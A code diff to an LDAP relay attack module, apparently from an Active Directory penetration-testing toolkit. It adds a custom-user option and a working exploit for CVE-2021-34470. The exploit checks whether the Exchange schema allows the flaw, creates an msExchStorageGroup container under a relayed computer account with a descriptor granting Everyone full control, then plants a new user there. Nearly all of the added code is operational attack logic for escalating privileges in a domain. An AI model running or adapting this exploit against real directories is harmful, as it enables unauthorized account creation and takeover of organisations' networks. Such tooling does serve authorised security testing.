@@ -116,6 +116,8 @@ class LDAPAttack(ProtocolAttack):
     GENERIC_ALL             = 0x000F01FF
 
     def __init__(self, config, LDAPClient, username):
+        self.userName = '' if not config.adduser else config.adduser[0]
+        self.userPassword = '' if not config.adduser or len(config.adduser) < 2 else config.adduser[1]
         self.computerName = '' if not config.addcomputer else config.addcomputer[0]
         self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
         ProtocolAttack.__init__(self, config, LDAPClient, username)
@@ -206,12 +208,22 @@ class LDAPAttack(ProtocolAttack):
                 LOG.error('StartTLS failed')
                 return False
 
-        # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+        userName = self.userName
+        if not userName:
+            # Random computername
+            newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        else:
+            newUser = userName
 
-        # Random username
-        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        userPassword = self.userPassword
+        if not userPassword:
+            # Random password
+            newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+        else:
+            newPassword = userPassword
+
         newUserDn = 'CN=%s,%s' % (newUser, parent)
+
         ucd = {
             'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
             'distinguishedName': newUserDn,
@@ -969,6 +981,72 @@ class LDAPAttack(ProtocolAttack):
             ][0]
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
+            return
+
+        # Add a new user if that is requested
+        if self.config.adduser is not None and self.username[-1] == '$':
+            LOG.info('Checking if `msExchStorageGroup` object exists within the schema and is vulnerable (CVE-2021-34470)')
+            res = self.client.search(self.client.server.info.other['schemaNamingContext'][0], '(cn=ms-Exch-Storage-Group)',
+                search_scope=ldap3.LEVEL, attributes=['possSuperiors'])
+            if not res:
+                LOG.error('Object `msExchStorageGroup` does not exist within the schema, Exchange is probably not installed')
+                return False
+            if 'computer' not in self.client.response[0]['attributes']['possSuperiors']:
+                LOG.error('Object `msExchStorageGroup` not vulnerable, was probably patched')
+                return False
+
+            # Get target computer DN
+            result = self.getUserInfo(domainDumper, self.username)
+            if not result:
+                LOG.error('Computer to modify does not exist! (wrong domain?)')
+                return False
+            target_dn = result[0]
+            target_sid = str(result[1])
+            controls = security_descriptor_control(sdflags=0x04)
+            LOG.debug("Computer DN is {}".format(target_dn))
+            # Random name
+            newContainer = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+            newContainerDn = 'CN=%s,%s' % (newContainer, target_dn)
+            sd = create_empty_sd()
+            sd['Control'] = 39940
+            sd['OwnerSid'] = ldaptypes.LDAP_SID()
+            sd['OwnerSid'].fromCanonical(target_sid)
+            sd['GroupSid'] = ldaptypes.LDAP_SID()
+            sd['GroupSid'].fromCanonical('S-1-5-11')
+            # ACE[0]: Full Access for Everyone
+            newace = create_allow_ace('S-1-1-0')
+            sd['Dacl'].aces.append(newace)
+            # ACE[1]: Generic All for Everyone
+            nace = ldaptypes.ACE()
+            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+            nace['AceFlags'] = 0xa
+            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+            acedata['Mask'] = ldaptypes.ACCESS_MASK()
+            acedata['Mask']['Mask'] = 268435456 # GENERIC_ALL
+            acedata['Sid'] = ldaptypes.LDAP_SID()
+            acedata['Sid'].fromCanonical('S-1-1-0')
+            nace['Ace'] = acedata
+            sd['Dacl'].aces.append(nace)
+            ucd = {
+                'distinguishedName': newContainerDn,
+                'nTSecurityDescriptor': sd.getData()
+            }
+            LOG.info('Attempting to create `msExchStorageGroup` container in: %s', target_dn)
+            containerDn = self.client.add(newContainerDn, ['top', 'container', 'msExchStorageGroup'], ucd, controls=controls)
+            if not containerDn:
+                # Adding container requires LDAPS
+                if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
+                    LOG.error('Failed to add a new container. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps).')
+                else:
+                    LOG.error('Failed to add a new container: %s' % str(self.client.result))
+                return False
+            else:
+                LOG.info('Adding new container with DN: %s result: OK' % newContainerDn)
+
+            containerDn = newContainerDn
+            userDn = self.addUser(containerDn, domainDumper)
+            if not userDn:
+                LOG.error('Unable to create a user.')
             return
 
         # Perform the Shadow Credentials attack if it is enabled
